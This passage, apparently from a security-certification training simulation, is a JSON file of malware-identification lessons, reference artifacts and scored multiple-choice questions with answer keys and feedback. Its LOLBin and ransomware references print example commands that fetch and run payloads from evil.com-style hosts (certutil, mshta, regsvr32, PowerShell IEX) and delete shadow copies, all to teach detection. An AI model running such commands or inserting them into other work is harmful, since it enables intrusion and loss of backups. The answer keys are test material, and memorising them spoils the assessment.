{
  "simulation_id": "D2-REM-002",
  "title": "Malware Menagerie",
  "domain": 2,
  "category": "remediation",
  "difficulty": "foundational",
  "time_estimate": "30-40 minutes",
  "passing_score": 200,
  "max_score": 250,
  
  "remediation_target": {
    "weakness": "Malware identification and indicator analysis",
    "triggered_by": ["D2-SIM-001", "D2-SIM-003"],
    "objectives_addressed": ["2.4"]
  },
  
  "exam_objectives": [
    {
      "id": "2.4",
      "description": "Given a scenario, analyze indicators of malicious activity",
      "coverage": ["malware types", "malware behaviors", "indicators of compromise", "attack indicators", "malware analysis basics"]
    }
  ],
  
  "scenario_context": {
    "organization": "SecureLearn Training Institute",
    "setting": "Malware Analysis Training Lab",
    "your_role": "SOC Analyst Trainee",
    "environment": {
      "training_type": "Malware Identification and Analysis Workshop",
      "resources": ["Isolated analysis VMs", "VirusTotal access", "YARA rules library", "Sandbox environment"],
      "instructor": "Senior Malware Analyst Dr. Chen"
    },
    "opening_narrative": "Welcome to the Malware Analysis fundamentals course. Dr. Chen greets you at the isolated training lab. 'Understanding malware - what it is, how it behaves, and how to identify it - is fundamental to security operations. Today we'll examine different malware types, learn to recognize their behaviors, and practice identifying indicators of compromise. By the end, you'll be able to look at an alert or artifact and understand what you're dealing with.'"
  },
  
  "artifacts": [
    {
      "id": "artifact_1",
      "title": "Malware Classification Guide",
      "type": "reference",
      "unlocks_at": "start",
      "content": {
        "malware_types": {
          "virus": {
            "definition": "Self-replicating code that attaches to legitimate programs",
            "propagation": "Requires host file; spreads when infected file is executed/shared",
            "characteristics": [
              "Modifies existing executable files",
              "Requires user action to spread",
              "Can be file infector, boot sector, or macro virus"
            ],
            "examples": ["CIH/Chernobyl", "Melissa (macro)", "ILOVEYOU"],
            "modern_prevalence": "Low - overshadowed by other malware types"
          },
          "worm": {
            "definition": "Self-replicating malware that spreads without host file",
            "propagation": "Spreads automatically over networks; no user action required",
            "characteristics": [
              "Exploits vulnerabilities to spread",
              "Can spread extremely rapidly",
              "Often causes network congestion",
              "Standalone - doesn't need to attach to files"
            ],
            "examples": ["WannaCry", "NotPetya", "Conficker", "SQL Slammer"],
            "modern_prevalence": "Medium - often combined with ransomware"
          },
          "trojan": {
            "definition": "Malware disguised as legitimate software",
            "propagation": "User downloads/installs thinking it's legitimate",
            "characteristics": [
              "Deception is key - looks legitimate",
              "Doesn't self-replicate",
              "Often delivers other malware (dropper)",
              "May provide backdoor access"
            ],
            "examples": ["Emotet", "TrickBot", "Zeus", "fake software downloads"],
            "modern_prevalence": "Very High - most common initial infection vector"
          },
          "ransomware": {
            "definition": "Encrypts victim data and demands payment for decryption",
            "propagation": "Via trojans, phishing, exploits, or RDP compromise",
            "characteristics": [
              "Encrypts files with strong cryptography",
              "Displays ransom note with payment instructions",
              "Often deletes shadow copies/backups",
              "May exfiltrate data before encryption (double extortion)"
            ],
            "examples": ["REvil/Sodinokibi", "Conti", "LockBit", "BlackMatter"],
            "modern_prevalence": "Very High - major threat to all organizations"
          },
          "spyware": {
            "definition": "Secretly monitors and collects user information",
            "propagation": "Bundled with software, trojans, or exploit kits",
            "characteristics": [
              "Keylogging - captures keystrokes",
              "Screen capture",
              "Credential theft",
              "Browsing history collection"
            ],
            "examples": ["Pegasus", "FinFisher", "keyloggers", "infostealers"],
            "modern_prevalence": "High - credential stealers are common"
          },
          "rootkit": {
            "definition": "Hides presence of malware from detection",
            "propagation": "Installed by other malware after initial compromise",
            "characteristics": [
              "Modifies OS to hide malicious activity",
              "Can operate at kernel level",
              "Very difficult to detect and remove",
              "Provides persistent hidden access"
            ],
            "examples": ["TDL4", "ZeroAccess", "Necurs"],
            "modern_prevalence": "Medium - sophisticated but complex to develop"
          },
          "rat": {
            "definition": "Remote Access Trojan - provides remote control of victim system",
            "propagation": "Via trojans, phishing, or exploits",
            "characteristics": [
              "Full remote control capability",
              "Can access files, camera, microphone",
              "Often used for espionage",
              "Command-and-control infrastructure required"
            ],
            "examples": ["Cobalt Strike", "NjRAT", "DarkComet", "Quasar"],
            "modern_prevalence": "Very High - standard tool for attackers"
          },
          "botnet_malware": {
            "definition": "Creates network of compromised computers (bots/zombies)",
            "propagation": "Various - worms, trojans, exploits",
            "characteristics": [
              "Central command and control",
              "Used for DDoS, spam, cryptomining",
              "Can contain thousands/millions of bots",
              "Resilient - hard to take down completely"
            ],
            "examples": ["Mirai", "Emotet", "Necurs", "TrickBot"],
            "modern_prevalence": "High - especially IoT botnets"
          }
        }
      }
    },
    {
      "id": "artifact_2",
      "title": "Indicators of Compromise (IoC) Types",
      "type": "reference",
      "unlocks_at": "decision_2",
      "content": {
        "ioc_categories": {
          "network_indicators": {
            "description": "Evidence of malicious network activity",
            "types": [
              {
                "type": "IP addresses",
                "example": "192.168.1.100 communicating with known C2: 185.220.101.45",
                "use": "Block at firewall, hunt in logs"
              },
              {
                "type": "Domain names",
                "example": "malware-c2.evil.com, update-service.azureedge.net (typosquat)",
                "use": "Block at DNS, hunt in proxy logs"
              },
              {
                "type": "URLs",
                "example": "http://evil.com/payload.exe",
                "use": "Block at proxy, detect in logs"
              },
              {
                "type": "Network signatures",
                "example": "Specific patterns in network traffic (beacon timing, packet structure)",
                "use": "IDS/IPS rules"
              }
            ]
          },
          "host_indicators": {
            "description": "Evidence of malicious activity on endpoints",
            "types": [
              {
                "type": "File hashes",
                "example": "SHA256: 8f3a7b2c9d1e5f6a3b8c9d0e1f2a3b4c...",
                "use": "EDR detection, file reputation"
              },
              {
                "type": "File names/paths",
                "example": "C:\\Windows\\Temp\\svchost.exe (legitimate name, wrong location)",
                "use": "Hunt for anomalous files"
              },
              {
                "type": "Registry keys",
                "example": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\malware",
                "use": "Detect persistence mechanisms"
              },
              {
                "type": "Scheduled tasks",
                "example": "\\Microsoft\\Windows\\Maintenance\\SystemUpdate (malicious task)",
                "use": "Detect persistence"
              },
              {
                "type": "Mutex names",
                "example": "Global\\UNIQUEMALWAREID",
                "use": "Detect malware presence"
              }
            ]
          },
          "email_indicators": {
            "description": "Evidence of malicious email campaigns",
            "types": [
              {
                "type": "Sender addresses",
                "example": "invoice@company-payments.com (lookalike domain)",
                "use": "Block sender, identify campaigns"
              },
              {
                "type": "Subject lines",
                "example": "URGENT: Invoice Payment Required",
                "use": "Email filtering rules"
              },
              {
                "type": "Attachment hashes",
                "example": "SHA256 of malicious macro document",
                "use": "Block specific attachments"
              }
            ]
          },
          "behavioral_indicators": {
            "description": "Patterns of malicious behavior rather than specific artifacts",
            "types": [
              {
                "type": "Process behaviors",
                "example": "Word.exe spawning PowerShell.exe",
                "use": "EDR behavioral detection"
              },
              {
                "type": "Authentication anomalies",
                "example": "Login from unusual location/time",
                "use": "UEBA, SIEM correlation"
              },
              {
                "type": "Data access patterns",
                "example": "User accessing unusual volume of sensitive files",
                "use": "DLP, insider threat detection"
              }
            ]
          }
        },
        "ioc_lifecycle": {
          "note": "IoCs have a shelf life - attackers change infrastructure",
          "ip_domains": "Days to weeks - easily changed",
          "file_hashes": "Weeks to months - malware is recompiled",
          "ttps": "Months to years - harder to change behavior"
        }
      }
    },
    {
      "id": "artifact_3",
      "title": "Malware Behavior Patterns",
      "type": "reference",
      "unlocks_at": "decision_4",
      "content": {
        "common_behaviors": {
          "persistence": {
            "description": "Mechanisms to survive reboot and maintain access",
            "techniques": [
              {"name": "Registry Run Keys", "location": "HKLM/HKCU...\\Run", "detection": "Monitor registry changes"},
              {"name": "Scheduled Tasks", "location": "Task Scheduler", "detection": "Monitor task creation"},
              {"name": "Services", "location": "Service Control Manager", "detection": "Monitor service installation"},
              {"name": "DLL Hijacking", "location": "Application directories", "detection": "Monitor DLL loads"},
              {"name": "Startup Folder", "location": "User startup folders", "detection": "Monitor folder contents"}
            ]
          },
          "defense_evasion": {
            "description": "Techniques to avoid detection",
            "techniques": [
              {"name": "Process Injection", "description": "Inject code into legitimate processes", "detection": "Monitor process memory"},
              {"name": "Obfuscation", "description": "Hide malicious code structure", "detection": "Behavioral analysis"},
              {"name": "Living off the Land", "description": "Use legitimate tools (PowerShell, WMI)", "detection": "Command line logging"},
              {"name": "Timestomping", "description": "Modify file timestamps", "detection": "Compare with MFT"},
              {"name": "Rootkit", "description": "Hide at OS level", "detection": "Specialized rootkit scanners"}
            ]
          },
          "command_and_control": {
            "description": "Communication with attacker infrastructure",
            "techniques": [
              {"name": "HTTP/HTTPS C2", "description": "Web traffic to C2 servers", "detection": "Proxy logs, beacon patterns"},
              {"name": "DNS C2", "description": "Data encoded in DNS queries", "detection": "DNS query analysis"},
              {"name": "Domain Generation", "description": "Algorithmically generated domains (DGA)", "detection": "DGA detection algorithms"},
              {"name": "Social Media C2", "description": "Commands via Twitter/Pastebin", "detection": "Social media monitoring"},
              {"name": "Encrypted Channels", "description": "TLS/custom encryption", "detection": "Traffic analysis, JA3 fingerprints"}
            ]
          },
          "data_exfiltration": {
            "description": "Stealing data from victim environment",
            "techniques": [
              {"name": "HTTP POST", "description": "Upload to web server", "detection": "Proxy, DLP"},
              {"name": "Cloud Storage", "description": "Dropbox, OneDrive, Mega", "detection": "Cloud service monitoring"},
              {"name": "DNS Tunneling", "description": "Data encoded in DNS", "detection": "DNS query analysis"},
              {"name": "Email", "description": "Attachments to external addresses", "detection": "Email DLP"},
              {"name": "Physical", "description": "USB drives", "detection": "USB monitoring"}
            ]
          }
        }
      }
    },
    {
      "id": "artifact_4",
      "title": "Living Off the Land Binaries (LOLBins)",
      "type": "reference",
      "unlocks_at": "decision_5",
      "content": {
        "lolbins_overview": {
          "definition": "Legitimate system binaries abused for malicious purposes",
          "why_used": [
            "Pre-installed on Windows - no need to drop tools",
            "Signed by Microsoft - bypasses application whitelisting",
            "Normal to see in environment - blends in",
            "Difficult to block without breaking legitimate use"
          ]
        },
        "common_lolbins": {
          "powershell": {
            "legitimate_use": "System administration, automation",
            "malicious_use": "Download payloads, execute in memory, encode commands",
            "example": "powershell -enc [base64] or IEX(New-Object Net.WebClient).DownloadString()",
            "detection": "ScriptBlock logging, command line monitoring"
          },
          "cmd": {
            "legitimate_use": "Command execution, batch scripts",
            "malicious_use": "Execute downloaded payloads, chain commands",
            "example": "cmd /c whoami & net user",
            "detection": "Command line monitoring, process parent analysis"
          },
          "certutil": {
            "legitimate_use": "Certificate management",
            "malicious_use": "Download files, decode base64",
            "example": "certutil -urlcache -split -f http://evil.com/payload.exe",
            "detection": "Monitor certutil with URL parameters"
          },
          "mshta": {
            "legitimate_use": "Run HTML applications",
            "malicious_use": "Execute malicious HTA files, bypass controls",
            "example": "mshta http://evil.com/payload.hta",
            "detection": "Monitor mshta execution with network URLs"
          },
          "wmic": {
            "legitimate_use": "WMI queries and management",
            "malicious_use": "Remote execution, persistence, reconnaissance",
            "example": "wmic process call create 'payload.exe'",
            "detection": "Monitor WMIC process creation calls"
          },
          "regsvr32": {
            "legitimate_use": "Register COM objects",
            "malicious_use": "Execute malicious scripts via scrobj.dll",
            "example": "regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll",
            "detection": "Monitor regsvr32 with network paths"
          },
          "rundll32": {
            "legitimate_use": "Execute DLL functions",
            "malicious_use": "Execute malicious DLLs",
            "example": "rundll32.exe malicious.dll,EntryPoint",
            "detection": "Monitor rundll32 with unusual DLLs"
          }
        },
        "detection_strategy": {
          "approach": "Cannot block LOLBins - must detect abuse",
          "methods": [
            "Command line logging and analysis",
            "Parent-child process relationships",
            "Behavioral baselines - what's normal?",
            "Network correlation - LOLBin + external connection"
          ]
        }
      }
    },
    {
      "id": "artifact_5",
      "title": "Ransomware Analysis Reference",
      "type": "reference",
      "unlocks_at": "decision_7",
      "content": {
        "ransomware_lifecycle": {
          "phase_1_initial_access": {
            "methods": ["Phishing email", "RDP compromise", "Exploit vulnerable service", "Supply chain"],
            "indicators": ["Suspicious email", "Failed RDP attempts", "Exploit signatures"]
          },
          "phase_2_establish_foothold": {
            "methods": ["Drop malware", "Establish persistence", "Deploy C2"],
            "indicators": ["New executables", "Registry changes", "Unusual network connections"]
          },
          "phase_3_lateral_movement": {
            "methods": ["Credential theft", "RDP/SMB to other systems", "Exploit internal vulnerabilities"],
            "indicators": ["Mimikatz artifacts", "Unusual authentications", "Admin tool usage"]
          },
          "phase_4_data_exfiltration": {
            "methods": ["Stage and compress data", "Upload to cloud/attacker server"],
            "indicators": ["7zip/rar usage", "Large outbound transfers", "Cloud storage connections"]
          },
          "phase_5_deployment": {
            "methods": ["Push ransomware via PsExec/GPO/WMI", "Execute encryption"],
            "indicators": ["Mass file modifications", "Ransom notes created", "Shadow copy deletion"]
          }
        },
        "ransomware_indicators": {
          "pre_encryption": [
            "Shadow copy deletion (vssadmin delete shadows)",
            "Backup service termination",
            "Security tool disabling",
            "Mass reconnaissance (ADFind, BloodHound)"
          ],
          "during_encryption": [
            "High disk I/O",
            "Mass file modification/creation",
            "File extension changes",
            "Ransom note creation"
          ],
          "post_encryption": [
            "Ransom note display",
            "C2 communication for victim registration",
            "Wallpaper change",
            "Self-deletion (some variants)"
          ]
        },
        "common_ransomware_families": {
          "lockbit": {
            "characteristics": "Fast encryption, affiliate program, data leak site",
            "extension": ".lockbit",
            "note_name": "Restore-My-Files.txt"
          },
          "conti": {
            "characteristics": "Manual operation, data theft, leaked playbook",
            "extension": ".CONTI",
            "note_name": "readme.txt"
          },
          "revil": {
            "characteristics": "High-profile attacks, RaaS model",
            "extension": ".random chars",
            "note_name": "[random]-readme.txt"
          }
        }
      }
    }
  ],
  
  "decision_points": [
    {
      "id": "decision_1",
      "sequence": 1,
      "title": "Basic Malware Classification",
      "narrative": "Dr. Chen starts with fundamentals. 'An analyst reports: user opened email attachment, Word spawned PowerShell, PowerShell downloaded and executed a file, the file is now communicating with an external server and the attacker has remote shell access. What category of malware is the initial Word document?'",
      "question": "What type of malware is the Word document that started this infection chain?",
      "options": [
        {
          "id": "A",
          "text": "Virus - it infected the Word application",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Viruses replicate by attaching to files",
            "detailed": "A virus would attach itself to other executable files and spread when those files are run. This Word document isn't replicating or attaching to other files - it's a document that tricks the user into enabling malicious macros. The document itself is a delivery mechanism, not a self-replicating virus.",
            "consequence": "Misclassification leads to wrong detection strategy."
          }
        },
        {
          "id": "B",
          "text": "Trojan - it appears legitimate but delivers malicious payload",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Classic trojan behavior",
            "detailed": "This is a trojan: it appears to be a legitimate document (invoice, resume, etc.) but when opened, it executes malicious code via macros. Trojans don't self-replicate - they rely on social engineering to get users to run them. The Word doc is a 'dropper' trojan that delivers the next stage payload.",
            "consequence": "Correct classification informs user awareness focus and email security priorities."
          }
        },
        {
          "id": "C",
          "text": "Worm - it's spreading through the network",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Worms spread automatically without user action",
            "detailed": "Worms self-propagate by exploiting vulnerabilities - they don't require user interaction. This malware required the user to open the document and enable macros. The attacker might later move laterally, but the initial document isn't a worm - it's a trojan that needed user action to execute.",
            "consequence": "Focus on network segmentation when email security is the issue."
          }
        },
        {
          "id": "D",
          "text": "RAT - the attacker has remote access",
          "is_correct": false,
          "points": 15,
          "feedback": {
            "short": "RAT is the payload, not the initial document",
            "detailed": "You're right that a RAT (Remote Access Trojan) is involved - the attacker has shell access. But the question asks about the WORD DOCUMENT. The document is a trojan dropper that delivered the RAT. The RAT is the final payload; the document is the delivery mechanism (also a trojan, specifically a dropper).",
            "consequence": "Confusing delivery mechanism with payload."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "What kind of malware relies on tricking users into executing it rather than self-replicating?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "Trojans disguise themselves as legitimate files. A malicious Word document is a classic trojan dropper."
        }
      ],
      "learning_note": "Trojans are malware disguised as legitimate files - they don't self-replicate but rely on social engineering. Malicious documents (Word, Excel, PDF) with macros or exploits are trojan droppers that deliver second-stage payloads. The document is the delivery mechanism; the RAT/backdoor is the final payload."
    },
    {
      "id": "decision_2",
      "sequence": 2,
      "title": "Identifying Indicators of Compromise",
      "narrative": "'Good. Now let's talk about IoCs,' Dr. Chen continues. 'You're investigating a compromised system. You find: a file hash matching known malware, registry key for persistence, and the malware is connecting to a specific IP address. Which indicator would you prioritize sharing with other teams for IMMEDIATE blocking?'",
      "question": "Which IoC should be prioritized for IMMEDIATE blocking across the environment?",
      "options": [
        {
          "id": "A",
          "text": "File hash - block this specific malware everywhere",
          "is_correct": false,
          "points": 15,
          "feedback": {
            "short": "Useful but easily changed by attackers",
            "detailed": "File hashes are useful for detecting specific malware samples, but attackers can trivially change hashes by recompiling or modifying a single byte. If you only block the hash, the attacker can generate a new variant that bypasses your block. Hashes are good for detection but less effective for blocking.",
            "consequence": "Hash blocked. Attacker uses different variant with new hash. Attack continues."
          }
        },
        {
          "id": "B",
          "text": "C2 IP address - block attacker's command and control",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Block C2 to disrupt active operations",
            "detailed": "Blocking the C2 IP address immediately disrupts the attacker's ability to control compromised systems. While attackers can change infrastructure, doing so takes time and may require malware updates. Blocking C2 buys time and may sever existing compromises. This is the highest-impact immediate action.",
            "consequence": "C2 blocked. Existing compromises can't receive commands. Attacker must establish new infrastructure."
          }
        },
        {
          "id": "C",
          "text": "Registry key - remove persistence mechanism",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Important for remediation but not blocking",
            "detailed": "Registry keys used for persistence are important for cleaning up infected systems, but they're not 'blockable' in the traditional sense - you remove them during remediation. The registry key path is useful for hunting but not for immediate network-level blocking.",
            "consequence": "Registry key documented for cleanup. C2 communication continues unchecked."
          }
        },
        {
          "id": "D",
          "text": "All indicators equally - comprehensive blocking is best",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Prioritization matters for immediate response",
            "detailed": "All indicators are valuable, but immediate response requires prioritization. C2 IP can be blocked at the firewall in minutes to disrupt active attacks. Hashes take time to deploy to all endpoints. Registry keys require system-by-system remediation. Block C2 first, then address other indicators.",
            "consequence": "Time spent on comprehensive approach while C2 communication continues."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "Which indicator, when blocked, immediately disrupts the attacker's ability to control compromised systems?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "C2 infrastructure is how attackers command their malware. Blocking C2 severs the attacker's control."
        }
      ],
      "learning_note": "IoC prioritization for blocking: C2 infrastructure (IPs, domains) disrupts active attacks immediately. File hashes help detection but are easily changed. Registry keys and file paths help remediation and hunting but aren't network-blockable. Prioritize C2 blocking for immediate impact.",
      "unlocks_artifact": "artifact_2"
    },
    {
      "id": "decision_3",
      "sequence": 3,
      "title": "Worm vs Other Malware",
      "narrative": "Dr. Chen presents a scenario: 'A hospital network is hit: within 2 hours, 500 computers display ransom notes. The malware exploited EternalBlue (MS17-010) to spread from the initial infected machine to all others automatically. No user interaction was required after the first infection. What type of malware is this?'",
      "question": "What type of malware caused this rapid spread across the hospital network?",
      "options": [
        {
          "id": "A",
          "text": "Ransomware - it encrypted files and demanded ransom",
          "is_correct": false,
          "points": 15,
          "feedback": {
            "short": "Ransomware describes the payload, not the propagation",
            "detailed": "The malware IS ransomware (it encrypts and demands payment), but the question asks about the TYPE based on behavior. The key characteristic here is AUTOMATIC PROPAGATION via vulnerability exploitation without user interaction. That's the defining characteristic of a worm. This is a ransomware worm - it combines worm propagation with ransomware payload.",
            "consequence": "Focus on ransomware response without addressing worm propagation vector."
          }
        },
        {
          "id": "B",
          "text": "Worm - it spreads automatically by exploiting vulnerabilities",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Self-propagation via exploit = worm",
            "detailed": "This describes WannaCry - a ransomware WORM. The defining characteristic of a worm is self-propagation without user interaction, typically by exploiting vulnerabilities. This malware exploited EternalBlue (SMB vulnerability) to spread automatically across the network. The ransomware payload is what it does; the worm is how it spreads.",
            "consequence": "Correct classification prioritizes patching and network segmentation to stop spread."
          }
        },
        {
          "id": "C",
          "text": "Trojan - it was delivered via initial infection",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Trojans don't self-propagate",
            "detailed": "The INITIAL infection might have been via trojan (user opening malicious file), but the spread to 500 machines wasn't via 500 users opening files - it was automatic exploitation. Trojans require user action for each infection. Self-propagation via vulnerability = worm.",
            "consequence": "Focus on user awareness when the propagation is vulnerability-based."
          }
        },
        {
          "id": "D",
          "text": "Botnet - it affected many computers",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Botnet describes coordinated control, not propagation method",
            "detailed": "A botnet is a network of compromised computers under attacker control - it describes the END STATE, not the propagation method. Botnets CAN be built by worms, trojans, or other methods. The question asks about the type based on HOW it spread - automatic vulnerability exploitation = worm.",
            "consequence": "Confusing malware type with infection outcome."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "What type of malware spreads automatically by exploiting vulnerabilities without user action?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "Worms are defined by self-propagation. WannaCry was a ransomware worm - worm propagation with ransomware payload."
        }
      ],
      "learning_note": "Worms are defined by AUTOMATIC SELF-PROPAGATION, typically via vulnerability exploitation. They don't require user action to spread (unlike trojans). Modern malware often combines types: WannaCry was a ransomware WORM (worm propagation + ransomware payload). Classification should consider both propagation method and payload."
    },
    {
      "id": "decision_4",
      "sequence": 4,
      "title": "Behavioral Indicator Analysis",
      "narrative": "'Let's look at behaviors,' Dr. Chen says. 'Your EDR flags this sequence: Word.exe â†’ PowerShell.exe â†’ encoded command â†’ downloads file from internet â†’ creates scheduled task â†’ connects to external IP every 4 hours. What behavior pattern is this describing?'",
      "question": "What malware behavior pattern does this sequence represent?",
      "options": [
        {
          "id": "A",
          "text": "Data exfiltration - stealing information from the system",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "No data theft indicators in this sequence",
            "detailed": "Data exfiltration would show: accessing sensitive files, staging/compressing data, uploading large amounts of data. This sequence shows: initial execution, download (inbound, not outbound), persistence (scheduled task), and C2 beacon (periodic contact, not bulk transfer). This is establishing access, not stealing data.",
            "consequence": "Focus on DLP when the issue is initial access and persistence."
          }
        },
        {
          "id": "B",
          "text": "Initial access and persistence with C2 beacon",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Classic initial infection establishing foothold",
            "detailed": "This shows the classic infection chain: Initial Access (Word macro â†’ PowerShell), Execution (encoded command downloads payload), Persistence (scheduled task ensures survival), and C2 (periodic beacon every 4 hours maintains communication). This is an attacker establishing their foothold and maintaining access for future operations.",
            "consequence": "Correct identification enables complete remediation: remove persistence, block C2, clean payload."
          }
        },
        {
          "id": "C",
          "text": "Lateral movement - spreading to other systems",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "No indication of spreading to other systems",
            "detailed": "Lateral movement would show: credential theft, authentication to other systems, RDP/SMB connections to other hosts. This sequence is all about establishing foothold on ONE system: executing payload, creating persistence, establishing C2. Lateral movement typically comes after this initial foothold is established.",
            "consequence": "Hunt for lateral movement that hasn't happened yet while initial access continues."
          }
        },
        {
          "id": "D",
          "text": "Ransomware deployment - preparing to encrypt",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "No encryption indicators present",
            "detailed": "Ransomware deployment would show: shadow copy deletion, mass file modification, ransom note creation. This sequence shows initial access and persistence - these might LEAD to ransomware eventually, but what we're seeing here is establishing the foothold. The 4-hour beacon suggests ongoing access, not imminent encryption.",
            "consequence": "Expect ransomware immediately when this is early-stage access."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "Break down the sequence: execution chain, then what? Persistence and regular communication suggest what?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "Scheduled task = persistence (surviving reboot). Regular external connection = C2 beacon. This is establishing and maintaining access."
        }
      ],
      "learning_note": "Malware behavior patterns follow phases: Initial Access (how it gets in), Execution (running payload), Persistence (surviving reboot), C2 (maintaining communication). Recognizing these patterns helps identify attack stage and inform response. This sequence shows early-stage foothold establishment - the attacker is now positioned for future operations.",
      "unlocks_artifact": "artifact_3"
    },
    {
      "id": "decision_5",
      "sequence": 5,
      "title": "Living Off the Land Detection",
      "narrative": "Dr. Chen shows an alert: 'Process: certutil.exe, Command: certutil -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\update.exe, Parent: cmd.exe, Grandparent: Excel.exe. Is this malicious?'",
      "question": "Is this certutil activity malicious?",
      "options": [
        {
          "id": "A",
          "text": "No - certutil is a legitimate Windows tool",
          "is_correct": false,
          "points": 0,
          "feedback": {
            "short": "Legitimate tools can be abused",
            "detailed": "Certutil IS a legitimate Windows tool for certificate management. However, it's being ABUSED here to download a file from the internet - the '-urlcache' parameter turns it into a file downloader. The process ancestry (Excel â†’ cmd â†’ certutil downloading from external URL) is classic Living Off the Land abuse. Legitimacy of the tool doesn't mean legitimate use.",
            "consequence": "Malicious activity missed because the tool is 'legitimate.'"
          }
        },
        {
          "id": "B",
          "text": "Yes - LOLBin abuse: certutil downloading file, spawned from Excel via cmd",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Classic LOLBin abuse pattern",
            "detailed": "This is textbook LOLBin (Living Off the Land Binary) abuse: Excel (macro) â†’ cmd â†’ certutil downloading from internet. Certutil's -urlcache parameter is commonly abused to download malware while bypassing application whitelisting (certutil is signed by Microsoft). The process chain and external URL download make this clearly malicious.",
            "consequence": "Correct identification enables blocking this technique and investigating the malicious document."
          }
        },
        {
          "id": "C",
          "text": "Need more information - could be legitimate admin activity",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Process ancestry tells us enough",
            "detailed": "The process ancestry is conclusive: Excel spawning cmd spawning certutil to download from external URL is NOT legitimate admin activity. Admins don't use Excel to run certutil to download files. This is a malicious macro using LOLBins. The pattern itself is the indicator - no additional context needed.",
            "consequence": "Delay investigation while gathering unnecessary context."
          }
        },
        {
          "id": "D",
          "text": "Suspicious but not conclusive - monitor for further activity",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "This IS conclusive - act now",
            "detailed": "This pattern is conclusive for malicious activity. Excel â†’ cmd â†’ certutil -urlcache to external URL is a known malicious pattern. Waiting to 'monitor for further activity' means letting the downloaded payload execute. Investigate and remediate immediately.",
            "consequence": "Payload executes while waiting for 'further activity.'"
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "Look at the process chain: what legitimate reason would Excel have to spawn certutil downloading from the internet?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "LOLBin abuse: legitimate tools used maliciously. Certutil -urlcache is commonly abused to download files. Excel â†’ cmd â†’ certutil is classic macro abuse."
        }
      ],
      "learning_note": "LOLBin detection requires understanding: (1) the tool's normal use vs. abuse patterns, (2) process ancestry (who spawned this?), and (3) command line parameters. Certutil -urlcache from Office application is almost always malicious. Process chain analysis (parent/grandparent) reveals abuse patterns.",
      "unlocks_artifact": "artifact_4"
    },
    {
      "id": "decision_6",
      "sequence": 6,
      "title": "C2 Communication Patterns",
      "narrative": "'Command and control is how attackers maintain access,' Dr. Chen explains. 'You observe network traffic: HTTPS connections to a random-looking domain every 4 hours, small data transfers (< 1KB), connections persist for exactly 30 seconds each time. What does this pattern indicate?'",
      "question": "What type of malicious network activity does this pattern indicate?",
      "options": [
        {
          "id": "A",
          "text": "Data exfiltration - small but regular transfers indicate stolen data",
          "is_correct": false,
          "points": 10,
          "feedback": {
            "short": "Small transfers don't fit exfiltration pattern",
            "detailed": "Data exfiltration typically involves larger, irregular transfers (documents, databases, etc.). Sub-1KB regular transfers with consistent timing are too small for meaningful data theft and too regular to be natural usage. This pattern fits C2 beacon behavior - checking in for commands, not stealing data.",
            "consequence": "DLP investigation when the issue is C2 communication."
          }
        },
        {
          "id": "B",
          "text": "C2 beacon - regular check-ins with command and control server",
          "is_correct": true,
          "points": 25,
          "feedback": {
            "short": "Correct! Classic beacon pattern",
            "detailed": "This is textbook C2 beacon behavior: regular interval (every 4 hours), small payload (< 1KB = 'any commands?'), consistent duration (30 seconds = standard timeout), encrypted channel (HTTPS). Beacons check in periodically to receive commands. The regularity and small size distinguish this from legitimate traffic or data exfiltration.",
            "consequence": "C2 identified. Can block domain/IP, hunt for other infected systems with same pattern."
          }
        },
        {
          "id": "C",
          "text": "Legitimate application update check",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "Update checks go to known domains, not random ones",
            "detailed": "Legitimate update checks go to recognizable vendor domains (microsoft.com, adobe.com), not random-looking domains. While the pattern (periodic, small) might superficially resemble update checks, the domain characteristic is the giveaway. Malware uses random or algorithmically generated domains for C2.",
            "consequence": "Malicious traffic missed because pattern 'looks like' updates."
          }
        },
        {
          "id": "D",
          "text": "DNS tunneling for covert communication",
          "is_correct": false,
          "points": 5,
          "feedback": {
            "short": "This is HTTPS, not DNS-based",
            "detailed": "DNS tunneling encodes data in DNS queries, not HTTPS traffic. The scenario describes HTTPS connections, which is standard web C2, not DNS tunneling. DNS tunneling would show unusual DNS query patterns, large/encoded TXT records, or high query volumes to unusual domains.",
            "consequence": "Looking for wrong communication type."
          }
        }
      ],
      "hints": [
        {
          "level": 1,
          "cost": 2,
          "text": "What network pattern shows regular small check-ins rather than data theft?"
        },
        {
          "level": 2,
          "cost": 5,
          "text": "C2 beacons: regular intervals, small payloads (checking for commands), consistent timing. Data exfiltration would be larger, irregular transfers."
        }
      ],
      "learning_note": "C2 beacon characteristics: regular intervals (jitter may vary), small payloads (commands, not data), consistent behavior, often encrypted. Distinguish from exfiltration (larger, irregular) and legitimate traffic (known domains, variable patterns). Detection focuses on timing regularity and domain reputation."
    },
    {
      "id": "decision_7",
